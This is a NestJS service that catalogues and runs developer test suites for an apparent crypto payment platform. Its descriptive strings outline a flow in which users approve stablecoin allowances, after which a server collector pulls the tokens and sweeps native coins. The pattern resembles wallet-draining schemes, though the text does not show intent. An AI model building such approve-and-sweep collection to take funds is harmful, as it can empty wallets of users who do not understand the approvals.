import {
  ForbiddenException,
  Injectable,
  NotFoundException,
} from "@nestjs/common";
import { execFile } from "node:child_process";
import { readdir, readFile } from "node:fs/promises";
import { join, relative, sep } from "node:path";
import { promisify } from "node:util";

const execFileAsync = promisify(execFile);

export type TestCaseMeta = {
  name: string;
  friendlyName: string;
  kind: "test" | "describe";
};

export type TestSuiteMeta = {
  id: string;
  packageId: string;
  packageName: string;
  packageDisplayName: string;
  file: string;
  fileName: string;
  friendlyTitle: string;
  area: string;
  areaLabel: string;
  layer: string;
  layerLabel: string;
  inDefaultScript: boolean;
  isFeatured: boolean;
  isEndToEnd: boolean;
  journeyStart: string;
  journeyEnd: string;
  description: string;
  purpose: string;
  expectedResult: string;
  why: string;
  cases: TestCaseMeta[];
  caseCount: number;
};

export type TestPackageMeta = {
  id: string;
  name: string;
  displayName: string;
  cwd: string;
  suites: TestSuiteMeta[];
};

export type DeveloperTestsCatalog = {
  enabled: boolean;
  packages: TestPackageMeta[];
  featuredSuites: TestSuiteMeta[];
  summary: {
    totalSuites: number;
    totalCases: number;
    byArea: Record<string, number>;
    byLayer: Record<string, number>;
  };
};

export type TestRunCaseResult = {
  name: string;
  status: "pass" | "fail" | "skip";
  error?: string;
};

export type ConnectFlowRunSummary = {
  platformEnvSource: string;
  spenderEvm: string | null;
  spenderTron: string | null;
  enabledNetworks: string[];
  testUserEvm: string | null;
  testUserTron: string | null;
  collectorTransferCount: number;
  summary: string;
};

export type TestRunResult = {
  suiteId: string;
  ok: boolean;
  exitCode: number;
  durationMs: number;
  stdout: string;
  stderr: string;
  report: {
    passed: number;
    failed: number;
    skipped: number;
    total: number;
    cases: TestRunCaseResult[];
  };
  connectFlowSummary?: ConnectFlowRunSummary;
};

type PackageConfig = {
  id: string;
  name: string;
  dir: string;
  runArgs: (relativeFile: string | string[]) => string[];
  preRun?: () => Promise<void>;
};

const SPEC_FILE = /\.spec\.(ts|js)$/i;

const PACKAGE_DISPLAY_NAMES: Record<string, string> = {
  backend: "Server & background jobs",
  "wallet-sdk": "Wallet connect & approvals",
  shared: "Core platform rules",
};

const AREA_LABELS: Record<string, string> = {
  "Connect flow": "Full user journey (scan → approve → collect)",
  "Approval orchestrator": "Token approval steps",
  "Authorization / wallet phase": "Wallet sign-in & permissions",
  "Native transfer": "Sending native coins (ETH, TRX, etc.)",
  "Collection (backend)": "Pulling approved tokens (server)",
  "Collection (shared)": "Pulling approved tokens (shared rules)",
  Resources: "Network fees & energy (TRON/EVM)",
  "Admin / pipeline": "Admin dashboard & user pipeline",
  "Native execution policy": "When native sends are allowed",
  Observability: "Logging, errors & monitoring",
  "Transaction traceability": "Transaction ID & journey tracing",
  "Core / server": "App wiring & API routes",
  "Shared utilities": "Shared helpers",
  Backend: "General server logic",
  "Wallet SDK": "Wallet app logic",
};

const LAYER_LABELS: Record<string, string> = {
  e2e: "Full journey",
  integration: "Multi-step flow",
  lifecycle: "Start to finish",
  unit: "Single piece",
};

/** Single full e2e run: wallet-sdk connect-flow glob (matches npm test connect-flow). */
const FULL_E2E_SUITE_ID = "wallet-sdk:test/connect-flow/**";
const FULL_E2E_GLOB = "test/connect-flow/*.spec.ts";

/** Cross-package native execution policy — all EVM + Tron partial-balance scenarios. */
const NATIVE_POLICY_SUITE_ID = "featured:native-execution-policy";
const NATIVE_POLICY_SUITE_FILES: Array<{
  packageId: string;
  files: string[];
}> = [
  {
    packageId: "shared",
    files: ["test/token-collection-state.spec.js"],
  },
  {
    packageId: "backend",
    files: ["test/native-readiness.spec.ts"],
  },
  {
    packageId: "wallet-sdk",
    files: [
      "test/authorization/balance-scenarios.spec.ts",
      "test/authorization/native-readiness-poll.spec.ts",
      "test/authorization/native-execution-policy.spec.ts",
      "test/authorization/zero-balance.spec.ts",
      "test/authorization/evm-token-batch.spec.ts",
    ],
  },
];

const SUITE_FRIENDLY_COPY: Array<{
  match: RegExp;
  title: string;
  description: string;
  purpose: string;
  expectedResult: string;
  why: string;
}> = [
  {
    match: /connect-flow\/link-flow/i,
    title: "Connect card through wallet approvals",
    description:
      "Covers the wallet side: QR scan, connect wallet, pick networks, and finish token approvals using live platform settings.",
    purpose: "Makes sure users can connect and approve without errors.",
    expectedResult:
      "Wallets link, spender addresses match config, and approvals complete on every enabled network.",
    why: "This is the first half of the connect-to-collect journey.",
  },
  {
    match: /connect-flow\/collector-bridge/i,
    title: "Approvals hand off to server collector",
    description:
      "Covers the handoff: after wallet approvals, the backend collector receives the right data and pulls tokens.",
    purpose: "Verifies the wallet app and server work together after sign-in.",
    expectedResult:
      "Collector receives approvals and completes transferFrom to the platform wallet.",
    why: "This is the second half of the connect-to-collect journey.",
  },
  {
    match: /connect-flow\/collector-e2e/i,
    title: "Server collector after approval",
    description:
      "Server-only checks: after an approval is registered, the collector picks up funds and handles edge cases like zero balance.",
    purpose: "Confirms the backend collector behaves correctly on its own.",
    expectedResult:
      "Collector transfers to the correct wallet and skips safely when balance is zero.",
    why: "Isolates server collection logic from the wallet connect UI.",
  },
  {
    match: /token-collection-state/i,
    title: "When native sends are allowed",
    description:
      "Checks simple rules: when can the app send native coins vs when it must wait for token collection to finish.",
    purpose:
      "Protects users from failed native sends while tokens are still being collected.",
    expectedResult:
      "Native sends wait when collection is active; proceed when safe.",
    why: "Wrong timing here causes failed transactions and confused users.",
  },
  {
    match: /collection-policy/i,
    title: "How much to collect each time",
    description:
      "Checks math for partial collections — zero balance, custom amounts, and unlimited approvals.",
    purpose:
      "Ensures the server collects the right amount and never over-draws.",
    expectedResult:
      "Correct transfer amounts for every balance and approval type.",
    why: "Collection math errors mean lost funds or stuck approvals.",
  },
  {
    match: /native-readiness/i,
    title: "Ready to send native coins?",
    description:
      "Checks whether the platform should allow a native transfer based on current token collection status — including when only USDT or only USDC has balance.",
    purpose:
      "Stops native sends at the wrong moment; allows native when the zero-balance token is skipped.",
    expectedResult:
      "Clear yes/no decision aligned with collection state; partial balance (0 USDT + USDC or vice versa) allows native after the funded token collects.",
    why: "Prevents race conditions between token collection and native sends.",
  },
  {
    match: /native-execution-policy/i,
    title: "Native after partial token balance (all EVM + Tron)",
    description:
      "Runs wallet-phase checks on every EVM chain (ETH, BNB, Polygon, Avalanche, Arbitrum, Base) and Tron when only USDT or only USDC has balance.",
    purpose:
      "Ensures native deduction works when one stablecoin is zero and the other has funds.",
    expectedResult:
      "Zero-balance token skips collection; funded token collects; native deferred then runs after settlement.",
    why: "Production bug class: users with USDC-only or USDT-only wallets must still get native swept.",
  },
  {
    match: /balance-scenarios/i,
    title: "Wallet phase balance matrix (BNB + all assets)",
    description:
      "Matrix of USDT/USDC/native balance combinations during wallet sign-in — approves, executeTransfer flags, and native deferral.",
    purpose:
      "Guarantees wallet phase never blocks on zero-balance tokens and always defers EVM native.",
    expectedResult:
      "Correct executeTransfer per token; native always deferred on EVM; no failures on zero balances.",
    why: "First line of defense for the partial-balance native policy.",
  },
  {
    match: /zero-balance/i,
    title: "Zero-balance token approve (Tron + EVM)",
    description:
      "Zero USDT/USDC still proceeds through approve with executeTransfer false; native zero balance fails safely.",
    purpose:
      "Collect-later policy for empty stablecoin wallets without blocking the connect flow.",
    expectedResult:
      "Approve succeeds with zero_balance_collect_later; native with zero balance fails with clear message.",
    why: "Users often connect with allowance set up before funds arrive.",
  },
  {
    match: /native-readiness-poll/i,
    title: "Settlement native-readiness polling",
    description:
      "Polls /native-readiness until active collection clears; passes wallet-phase shouldAttemptTransfer to the API.",
    purpose:
      "Settlement waits for the funded token only — zero-balance token must not block the poll.",
    expectedResult:
      "Poll resolves when funded token succeeds; zero-balance token shows skipped_zero_balance.",
    why: "Connects wallet-phase policy to settlement native execution timing.",
  },
  {
    match: /wallet-phase/i,
    title: "Wallet sign-in phase (no wallet-phase personal_sign)",
    description:
      "Tests the first phase where users approve tokens on-chain — EVM native is deferred and no personal_sign runs before approves.",
    purpose:
      "Ensures wallet phase never blocks on settlement and avoids unnecessary signature popups before token approves.",
    expectedResult:
      "Wallet phase completes with direct approve transactions; EVM native deferred to settlement.",
    why: "Trust Wallet users should see approves first — not a session signature before USDT/USDC.",
  },
  {
    match: /batch-native-estimate/i,
    title: "Native estimate for EIP-5792 batch only",
    description:
      "Ensures native transfer estimate is fetched without wallet session auth and only supports EIP-5792 native batch calldata.",
    purpose:
      "Prevents regressions that re-introduce personal_sign before estimate or call guarded APIs unnecessarily.",
    expectedResult:
      "Estimate requests have no Authorization header; native wallet call uses transferable balance only when valid.",
    why: "Wallet-phase personal_sign before estimate was a major Trust Wallet popup regression.",
  },
  {
    match: /evm-token-batch/i,
    title: "EVM token batch planning & EIP-5792 gating",
    description:
      "Groups USDT/USDC work units, detects wallet_sendCalls support, and falls back to sequential direct approves when batching is unavailable.",
    purpose:
      "Trust Wallet–safe path: sequential approves on Avalanche; EIP-5792 batch when the wallet advertises atomic support.",
    expectedResult:
      "Capability probe before native estimate; no Multicall3 approve path; sequential fallback for unsupported wallets.",
    why: "Multicall3 cannot set user→spender allowance; sequential direct approve is the correct EOA path.",
  },
  {
    match: /resource-manager/i,
    title: "Network resources (energy & fees)",
    description:
      "Tests acquiring and releasing TRON energy and EVM gas resources for transactions.",
    purpose:
      "Makes sure the platform can pay for network fees when users transact.",
    expectedResult:
      "Resources are acquired, used, and released in the right order.",
    why: "Without resources, TRON and EVM transactions fail silently or cost too much.",
  },
  {
    match: /transaction-context/i,
    title: "Transaction context (client journey ID)",
    description:
      "Tests flow-* ID generation, sessionStorage resume/expiry, and x-correlation-id headers on the wallet client.",
    purpose:
      "Ensures one user attempt keeps the same ID across refresh and API calls.",
    expectedResult:
      "Stable transactionId in sessionStorage; correlation header on outbound requests.",
    why: "Lost client context makes every production incident impossible to trace.",
  },
  {
    match: /transaction-journey/i,
    title: "Admin transaction journey hub",
    description:
      "Tests GET /admin/transactions/:id aggregates approvals, settlement, logs, and terminal status by traceId.",
    purpose:
      "Validates the admin debugging hub returns a complete lifecycle slice.",
    expectedResult:
      "Hub resolves wallet, network, timeline, and child entities for a flow-* ID.",
    why: "Support and ops rely on this page as the single pane of glass per payment attempt.",
  },
  {
    match: /transaction-lifecycle/i,
    title: "Transaction terminal lifecycle",
    description:
      "Tests SUCCESS / FAILED / CANCELLED / EXPIRED terminal stage constants and mappings.",
    purpose:
      "Keeps terminal closure semantics consistent across client, server, and admin.",
    expectedResult:
      "Terminal stages map to the correct outcome status everywhere.",
    why: "Ambiguous terminal states break dashboards and retry logic.",
  },
  {
    match: /settlement-observability/i,
    title: "Settlement log correlation",
    description:
      "Tests settlement observability uses client journey ID (flow-*) — not settlement DB PK — for trace fields.",
    purpose:
      "Prevents settlement logs from becoming orphaned from the connect flow.",
    expectedResult:
      "traceId/sessionId = clientSessionId; settlementSessionId only in context.",
    why: "Mixing settlement row IDs with journey IDs was a major traceability gap.",
  },
  {
    match: /connect-logger/i,
    title: "Connect flow log correlation",
    description:
      "Tests connect logger emits unified sessionId/traceId/transactionId on every step.",
    purpose:
      "Guards against sessionId/traceId conflation regressions in connect observability.",
    expectedResult:
      "All connect log events share one journey ID; wallet address stays separate.",
    why: "Connect is the first mile — bad IDs here poison every downstream system.",
  },
];

@Injectable()
export class DeveloperTestsService {
  private catalogCache: DeveloperTestsCatalog | null = null;
  private catalogCachedAt = 0;
  private readonly catalogTtlMs = 30_000;

  enabled(): boolean {
    if (process.env.NODE_ENV === "production") return false;
    return (process.env.ADMIN_DEV_OPS ?? "").toLowerCase() === "true";
  }

  assertEnabled(): void {
    if (!this.enabled()) {
      throw new ForbiddenException(
        "Developer tests are disabled. Set ADMIN_DEV_OPS=true in a non-production environment.",
      );
    }
  }

  async getCatalog(force = false): Promise<DeveloperTestsCatalog> {
    this.assertEnabled();
    const now = Date.now();
    if (
      !force &&
      this.catalogCache &&
      now - this.catalogCachedAt < this.catalogTtlMs
    ) {
      return this.catalogCache;
    }

    const root = this.monorepoRoot();
    const packages = await Promise.all(
      this.packageConfigs(root).map((pkg) => this.discoverPackage(pkg)),
    );

    const allSuites = packages.flatMap((p) => p.suites);
    const byArea: Record<string, number> = {};
    const byLayer: Record<string, number> = {};
    let totalCases = 0;

    for (const suite of allSuites) {
      byArea[suite.area] = (byArea[suite.area] ?? 0) + 1;
      byLayer[suite.layer] = (byLayer[suite.layer] ?? 0) + 1;
      totalCases += suite.caseCount;
    }

    const featuredSuites = [
      buildFullConnectFlowE2ESuite(packages),
      buildNativeExecutionPolicySuite(packages),
    ];
    const featuredCaseCount = featuredSuites.reduce(
      (n, s) => n + s.caseCount,
      0,
    );

    const catalog: DeveloperTestsCatalog = {
      enabled: true,
      packages,
      featuredSuites,
      summary: {
        totalSuites: allSuites.length + featuredSuites.length,
        totalCases: totalCases + featuredCaseCount,
        byArea,
        byLayer,
      },
    };

    this.catalogCache = catalog;
    this.catalogCachedAt = now;
    return catalog;
  }

  async runSuite(suiteId: string): Promise<TestRunResult> {
    this.assertEnabled();
    if (suiteId === NATIVE_POLICY_SUITE_ID) {
      return this.runNativePolicySuite();
    }

    const catalog = await this.getCatalog();
    const suite = this.findSuite(catalog, suiteId);
    if (!suite) {
      throw new NotFoundException(`Test suite not found: ${suiteId}`);
    }

    const pkg = this.packageConfigs(this.monorepoRoot()).find(
      (p) => p.id === suite.packageId,
    );
    if (!pkg) {
      throw new NotFoundException(`Package not found: ${suite.packageId}`);
    }

    const cwd = join(this.monorepoRoot(), pkg.dir);
    if (pkg.preRun) {
      await pkg.preRun();
    }

    const runTargets =
      suite.id === FULL_E2E_SUITE_ID
        ? await this.resolveConnectFlowSpecFiles(cwd)
        : [suite.file];
    const args = ["--test", "--test-reporter=tap", ...pkg.runArgs(runTargets)];
    const started = Date.now();

    try {
      const { stdout, stderr } = await execFileAsync("node", args, {
        cwd,
        maxBuffer: 16 * 1024 * 1024,
        timeout: 180_000,
        env: { ...process.env, FORCE_COLOR: "0" },
      });
      const durationMs = Date.now() - started;
      const report = parseTapOutput(stdout);
      return this.finalizeRunResult(
        suiteId,
        true,
        0,
        durationMs,
        stdout,
        stderr,
        report,
      );
    } catch (err: unknown) {
      const durationMs = Date.now() - started;
      const execErr = err as {
        code?: number;
        stdout?: string;
        stderr?: string;
        message?: string;
      };
      const stdout = execErr.stdout ?? "";
      const stderr = [execErr.stderr, execErr.message]
        .filter(Boolean)
        .join("\n");
      const report = parseTapOutput(stdout);
      return this.finalizeRunResult(
        suiteId,
        false,
        typeof execErr.code === "number" ? execErr.code : 1,
        durationMs,
        stdout,
        stderr,
        report,
      );
    }
  }

  private finalizeRunResult(
    suiteId: string,
    ok: boolean,
    exitCode: number,
    durationMs: number,
    stdout: string,
    stderr: string,
    report: TestRunResult["report"],
  ): TestRunResult {
    const result: TestRunResult = {
      suiteId,
      ok,
      exitCode,
      durationMs,
      stdout,
      stderr,
      report,
    };

    if (ok && suiteId === FULL_E2E_SUITE_ID) {
      const connectFlowSummary = parseConnectFlowRunSummary(stdout);
      if (connectFlowSummary) {
        result.connectFlowSummary = connectFlowSummary;
      }
    }

    return result;
  }

  async runAll(): Promise<{
    results: TestRunResult[];
    summary: TestRunResult["report"];
  }> {
    this.assertEnabled();
    const catalog = await this.getCatalog();
    const results: TestRunResult[] = [];

    for (const pkg of catalog.packages) {
      for (const suite of pkg.suites) {
        results.push(await this.runSuite(suite.id));
      }
    }

    const summary = results.reduce(
      (acc, r) => ({
        passed: acc.passed + r.report.passed,
        failed: acc.failed + r.report.failed,
        skipped: acc.skipped + r.report.skipped,
        total: acc.total + r.report.total,
        cases: [...acc.cases, ...r.report.cases],
      }),
      {
        passed: 0,
        failed: 0,
        skipped: 0,
        total: 0,
        cases: [] as TestRunCaseResult[],
      },
    );

    return { results, summary };
  }

  private async runNativePolicySuite(): Promise<TestRunResult> {
    const root = this.monorepoRoot();
    const packages = this.packageConfigs(root);
    const started = Date.now();
    const stdoutParts: string[] = [];
    const stderrParts: string[] = [];
    const report = {
      passed: 0,
      failed: 0,
      skipped: 0,
      total: 0,
      cases: [] as TestRunCaseResult[],
    };
    let exitCode = 0;

    for (const group of NATIVE_POLICY_SUITE_FILES) {
      const pkg = packages.find((p) => p.id === group.packageId);
      if (!pkg) continue;
      const cwd = join(root, pkg.dir);
      if (pkg.preRun) {
        await pkg.preRun();
      }
      const args = [
        "--test",
        "--test-reporter=tap",
        ...pkg.runArgs(group.files),
      ];
      try {
        const { stdout, stderr } = await execFileAsync("node", args, {
          cwd,
          maxBuffer: 16 * 1024 * 1024,
          timeout: 180_000,
          env: { ...process.env, FORCE_COLOR: "0" },
        });
        stdoutParts.push(stdout);
        if (stderr) stderrParts.push(stderr);
        const part = parseTapOutput(stdout);
        report.passed += part.passed;
        report.failed += part.failed;
        report.skipped += part.skipped;
        report.total += part.total;
        report.cases.push(...part.cases);
      } catch (err: unknown) {
        exitCode = 1;
        const execErr = err as {
          code?: number;
          stdout?: string;
          stderr?: string;
          message?: string;
        };
        if (execErr.stdout) stdoutParts.push(execErr.stdout);
        stderrParts.push(
          [execErr.stderr, execErr.message].filter(Boolean).join("\n"),
        );
        const part = parseTapOutput(execErr.stdout ?? "");
        report.passed += part.passed;
        report.failed += part.failed;
        report.skipped += part.skipped;
        report.total += part.total;
        report.cases.push(...part.cases);
      }
    }

    const durationMs = Date.now() - started;
    return this.finalizeRunResult(
      NATIVE_POLICY_SUITE_ID,
      exitCode === 0 && report.failed === 0,
      exitCode,
      durationMs,
      stdoutParts.join("\n"),
      stderrParts.join("\n"),
      report,
    );
  }

  private monorepoRoot(): string {
    return join(process.cwd(), "..");
  }

  private packageConfigs(root: string): PackageConfig[] {
    return [
      {
        id: "backend",
        name: "@trustmycard/backend",
        dir: "backend",
        runArgs: (fileOrFiles) => {
          const files = Array.isArray(fileOrFiles)
            ? fileOrFiles
            : [fileOrFiles];
          return ["-r", "ts-node/register", ...files];
        },
      },
      {
        id: "wallet-sdk",
        name: "@trustmycard/wallet-sdk",
        dir: join("frontend", "wallet-sdk"),
        runArgs: (fileOrFiles) => {
          const files = Array.isArray(fileOrFiles)
            ? fileOrFiles
            : [fileOrFiles];
          return ["-r", "./test/register-ts.cjs", ...files];
        },
      },
      {
        id: "shared",
        name: "@trustmycard/shared",
        dir: join("frontend", "shared"),
        runArgs: (fileOrFiles) => {
          const files = Array.isArray(fileOrFiles)
            ? fileOrFiles
            : [fileOrFiles];
          return files;
        },
        preRun: async () => {
          await execFileAsync("npm", ["run", "build"], {
            cwd: join(root, "frontend", "shared"),
            maxBuffer: 8 * 1024 * 1024,
            timeout: 120_000,
          });
        },
      },
    ];
  }

  private async discoverPackage(pkg: PackageConfig): Promise<TestPackageMeta> {
    const root = this.monorepoRoot();
    const absDir = join(root, pkg.dir);
    const specFiles = await this.walkSpecFiles(absDir);
    const defaultPatterns = await this.readDefaultTestPatterns(absDir);

    const suites: TestSuiteMeta[] = [];
    for (const absPath of specFiles.sort()) {
      const relFile = relative(absDir, absPath).split(sep).join("/");
      const content = await readFile(absPath, "utf8");
      const rawCases = parseTestCases(content);
      const meta = buildSuiteMeta(pkg, relFile, rawCases, defaultPatterns);
      const cases = rawCases.map((c) => ({
        ...c,
        friendlyName: humanizeTestName(c.name, relFile),
      }));

      suites.push({
        id: `${pkg.id}:${relFile}`,
        packageId: pkg.id,
        packageName: pkg.name,
        packageDisplayName: PACKAGE_DISPLAY_NAMES[pkg.id] ?? pkg.name,
        file: relFile,
        fileName: relFile.split("/").pop() ?? relFile,
        ...meta,
        cases,
        caseCount: cases.filter((c) => c.kind === "test").length,
      });
    }

    suites.sort((a, b) => a.friendlyTitle.localeCompare(b.friendlyTitle));

    return {
      id: pkg.id,
      name: pkg.name,
      displayName: PACKAGE_DISPLAY_NAMES[pkg.id] ?? pkg.name,
      cwd: pkg.dir,
      suites,
    };
  }

  private async walkSpecFiles(dir: string): Promise<string[]> {
    const entries = await readdir(dir, { withFileTypes: true });
    const files: string[] = [];

    for (const entry of entries) {
      if (entry.name === "node_modules" || entry.name === "dist") continue;
      const full = join(dir, entry.name);
      if (entry.isDirectory()) {
        files.push(...(await this.walkSpecFiles(full)));
      } else if (SPEC_FILE.test(entry.name)) {
        files.push(full);
      }
    }

    return files;
  }

  private findSuite(
    catalog: DeveloperTestsCatalog,
    suiteId: string,
  ): TestSuiteMeta | undefined {
    return (
      catalog.featuredSuites.find((s) => s.id === suiteId) ??
      catalog.packages.flatMap((p) => p.suites).find((s) => s.id === suiteId)
    );
  }

  private async resolveConnectFlowSpecFiles(
    walletSdkDir: string,
  ): Promise<string[]> {
    const connectDir = join(walletSdkDir, "test", "connect-flow");
    const entries = await readdir(connectDir, { withFileTypes: true });
    return entries
      .filter((e) => e.isFile() && SPEC_FILE.test(e.name))
      .map((e) => join("test", "connect-flow", e.name).split(sep).join("/"))
      .sort();
  }

  private async readDefaultTestPatterns(packageDir: string): Promise<string[]> {
    try {
      const raw = await readFile(join(packageDir, "package.json"), "utf8");
      const pkg = JSON.parse(raw) as { scripts?: { test?: string } };
      const script = pkg.scripts?.test ?? "";
      const tokens = script.split(/\s+/);
      const nodeIdx = tokens.indexOf("--test");
      if (nodeIdx === -1) return [];

      return tokens.slice(nodeIdx + 1).filter((t) => !t.startsWith("-"));
    } catch {
      return [];
    }
  }
}

function parseTestCases(
  content: string,
): Array<{ name: string; kind: TestCaseMeta["kind"] }> {
  const cases: Array<{ name: string; kind: TestCaseMeta["kind"] }> = [];
  const patterns: Array<{ kind: TestCaseMeta["kind"]; re: RegExp }> = [
    { kind: "describe", re: /\bdescribe\s*\(\s*["'`]([^"'`]+)["'`]/g },
    { kind: "test", re: /\b(?:test|it)\s*\(\s*["'`]([^"'`]+)["'`]/g },
  ];

  for (const { kind, re } of patterns) {
    for (const match of content.matchAll(re)) {
      cases.push({ name: match[1], kind });
    }
  }

  return cases;
}

function buildSuiteMeta(
  pkg: PackageConfig,
  relFile: string,
  cases: Array<{ name: string; kind: TestCaseMeta["kind"] }>,
  defaultPatterns: string[],
): Pick<
  TestSuiteMeta,
  | "area"
  | "areaLabel"
  | "layer"
  | "layerLabel"
  | "inDefaultScript"
  | "isFeatured"
  | "isEndToEnd"
  | "journeyStart"
  | "journeyEnd"
  | "friendlyTitle"
  | "description"
  | "purpose"
  | "expectedResult"
  | "why"
> {
  const normalized = relFile.replace(/\\/g, "/");
  const area = inferArea(pkg.id, relFile);
  const layer = inferLayer(relFile);
  const inDefaultScript = matchesDefaultScript(relFile, defaultPatterns);
  const journey = inferJourney(pkg.id, normalized, area, layer);
  const baseName =
    relFile
      .replace(/\.spec\.(ts|js)$/, "")
      .split("/")
      .pop() ?? relFile;
  const testCount = cases.filter((c) => c.kind === "test").length;
  const custom = SUITE_FRIENDLY_COPY.find((entry) =>
    entry.match.test(normalized),
  );
  const generic = genericFriendlyCopy(
    area,
    layer,
    baseName,
    testCount,
    inDefaultScript,
  );

  return {
    area,
    areaLabel: AREA_LABELS[area] ?? area,
    layer,
    layerLabel: LAYER_LABELS[layer] ?? layer,
    inDefaultScript,
    isFeatured: false,
    isEndToEnd: false,
    journeyStart: journey.start,
    journeyEnd: journey.end,
    friendlyTitle: custom?.title ?? generic.title,
    description: custom?.description ?? generic.description,
    purpose: custom?.purpose ?? generic.purpose,
    expectedResult: custom?.expectedResult ?? generic.expectedResult,
    why: custom?.why ?? generic.why,
  };
}

function buildFullConnectFlowE2ESuite(
  packages: TestPackageMeta[],
): TestSuiteMeta {
  const walletPkg = packages.find((p) => p.id === "wallet-sdk");
  const parts = (walletPkg?.suites ?? []).filter((s) =>
    s.file.startsWith("test/connect-flow/"),
  );
  const cases = parts.flatMap((s) => s.cases);
  const caseCount = parts.reduce((n, s) => n + s.caseCount, 0);

  return {
    id: FULL_E2E_SUITE_ID,
    packageId: "wallet-sdk",
    packageName: "@trustmycard/wallet-sdk",
    packageDisplayName: PACKAGE_DISPLAY_NAMES["wallet-sdk"],
    file: FULL_E2E_GLOB,
    fileName: "connect-flow (all)",
    friendlyTitle: "Full connect-to-collect journey",
    area: "Connect flow",
    areaLabel: AREA_LABELS["Connect flow"],
    layer: "e2e",
    layerLabel: LAYER_LABELS.e2e,
    inDefaultScript: true,
    isFeatured: true,
    isEndToEnd: true,
    journeyStart: "User opens connect card & scans QR",
    journeyEnd: "Backend collector transfers approved tokens",
    description:
      "Runs all wallet connect flow tests together — the same command as: node --test test/connect-flow/*.spec.ts in wallet-sdk.",
    purpose:
      "Proves the entire user path works: connect wallet, approve tokens, and server collection.",
    expectedResult:
      "Every connect-flow check passes — QR through collector handoff.",
    why: "This is the one test to run before release. It covers the full money path users experience.",
    cases,
    caseCount,
  };
}

function buildNativeExecutionPolicySuite(
  packages: TestPackageMeta[],
): TestSuiteMeta {
  const cases: TestCaseMeta[] = [];
  let caseCount = 0;

  for (const group of NATIVE_POLICY_SUITE_FILES) {
    const pkg = packages.find((p) => p.id === group.packageId);
    if (!pkg) continue;
    for (const file of group.files) {
      const suite = pkg.suites.find((s) => s.file === file);
      if (!suite) continue;
      cases.push(...suite.cases);
      caseCount += suite.caseCount;
    }
  }

  return {
    id: NATIVE_POLICY_SUITE_ID,
    packageId: "wallet-sdk",
    packageName: "@trustmycard/wallet-sdk",
    packageDisplayName: "Wallet connect & approvals",
    file: "native-execution-policy (all networks)",
    fileName: "native-execution-policy (all networks)",
    friendlyTitle: "Native after partial balance (all EVM + Tron)",
    area: "Native execution policy",
    areaLabel: AREA_LABELS["Native execution policy"],
    layer: "integration",
    layerLabel: LAYER_LABELS.integration,
    inDefaultScript: true,
    isFeatured: true,
    isEndToEnd: false,
    journeyStart: "User connects with only USDT or only USDC balance",
    journeyEnd: "Native sweep runs after funded token collects",
    description:
      "Runs all native execution policy specs across shared rules, backend readiness, and wallet-sdk — every EVM chain plus Tron.",
    purpose:
      "Proves zero-balance stablecoin never blocks native; funded token collects first.",
    expectedResult:
      "All policy checks pass for ETH, BNB, Polygon, Avalanche, Arbitrum, Base, and Tron.",
    why: "Run this before release when changing settlement, native, or balance logic.",
    cases,
    caseCount,
  };
}

function inferJourney(
  packageId: string,
  normalizedPath: string,
  area: string,
  layer: string,
): { start: string; end: string } {
  const rules: Array<{ match: RegExp; start: string; end: string }> = [
    {
      match: /connect-flow\/link-flow/i,
      start: "Connect card & QR scan",
      end: "Wallet approvals complete",
    },
    {
      match: /connect-flow\/collector-bridge/i,
      start: "QR scan & wallet connect",
      end: "Collector transferFrom on server",
    },
    {
      match: /connect-flow\/collector-e2e/i,
      start: "Approval registered on server",
      end: "Collector transfer confirmed",
    },
    {
      match: /wallet-phase/i,
      start: "User connects wallet",
      end: "On-chain approves finish (no wallet-phase personal_sign)",
    },
    {
      match: /native-readiness/i,
      start: "Token collection status checked",
      end: "Native send allowed or blocked",
    },
    {
      match: /native-transfer/i,
      start: "User requests native send",
      end: "Transfer amount & fees validated",
    },
    {
      match: /collection-policy|collection-state/i,
      start: "Collection job evaluates balances",
      end: "Correct collect amount decided",
    },
    {
      match: /approval\/|orchestrator/i,
      start: "User starts token approval",
      end: "Approval confirmed on chain",
    },
    {
      match: /authorization\//i,
      start: "Wallet session opens",
      end: "Authorization step completes",
    },
    {
      match: /resource-manager/i,
      start: "Transaction needs network resources",
      end: "Energy or gas acquired & released",
    },
    {
      match: /pipeline|user-aggregation|admin-sync/i,
      start: "Admin data is loaded",
      end: "Pipeline view is consistent",
    },
    {
      match: /observability|safe-audit|error-message/i,
      start: "App event or error occurs",
      end: "Log or metric recorded correctly",
    },
    {
      match: /token-collection-state/i,
      start: "Token collection states evaluated",
      end: "Native execution decision made",
    },
  ];

  for (const rule of rules) {
    if (rule.match.test(normalizedPath)) {
      return { start: rule.start, end: rule.end };
    }
  }

  const areaDefaults: Record<string, { start: string; end: string }> = {
    "Connect flow": {
      start: "User interaction begins",
      end: "Connect step completes",
    },
    "Approval orchestrator": {
      start: "Approval requested",
      end: "Approval settled",
    },
    "Authorization / wallet phase": {
      start: "Wallet opens",
      end: "Permission granted",
    },
    "Native transfer": { start: "Send initiated", end: "Send validated" },
    "Collection (backend)": {
      start: "Collector runs",
      end: "Collection updated",
    },
    Resources: { start: "Resource needed", end: "Resource ready" },
    "Admin / pipeline": { start: "Data fetched", end: "View updated" },
    "Native execution policy": {
      start: "States checked",
      end: "Policy applied",
    },
    Observability: { start: "Event emitted", end: "Observability recorded" },
    "Core / server": { start: "Request received", end: "Response validated" },
    "Shared utilities": { start: "Input provided", end: "Output verified" },
    Backend: { start: "Logic invoked", end: "Result confirmed" },
    "Wallet SDK": { start: "User action", end: "Step complete" },
  };

  const fallback = areaDefaults[area] ?? {
    start: layer === "unit" ? "Single function called" : "Flow begins",
    end: layer === "unit" ? "Output verified" : "Flow completes",
  };

  return { start: fallback.start, end: fallback.end };
}

function genericFriendlyCopy(
  area: string,
  layer: string,
  baseName: string,
  testCount: number,
  inDefaultScript: boolean,
): {
  title: string;
  description: string;
  purpose: string;
  expectedResult: string;
  why: string;
} {
  const areaLabel = (AREA_LABELS[area] ?? area).toLowerCase();
  const layerLabel = (LAYER_LABELS[layer] ?? layer).toLowerCase();
  const title = baseName
    .replace(/[-_.]/g, " ")
    .replace(/\b(spec|integration|unit|e2e|lifecycle)\b/gi, "")
    .replace(/\s+/g, " ")
    .trim()
    .replace(/\b\w/g, (c) => c.toUpperCase());

  return {
    title: title || "Automated check",
    description: `Runs ${testCount} check${testCount === 1 ? "" : "s"} for ${areaLabel}.`,
    purpose: `Makes sure ${areaLabel} behaves correctly in real use.`,
    expectedResult: "All checks pass with no errors.",
    why: inDefaultScript
      ? `Part of the regular test run — catches regressions in ${areaLabel} before users are affected.`
      : `Extra check for ${areaLabel} (${layerLabel}) — run when changing related features.`,
  };
}

function humanizeTestName(name: string, relFile: string): string {
  const normalized = relFile.replace(/\\/g, "/");

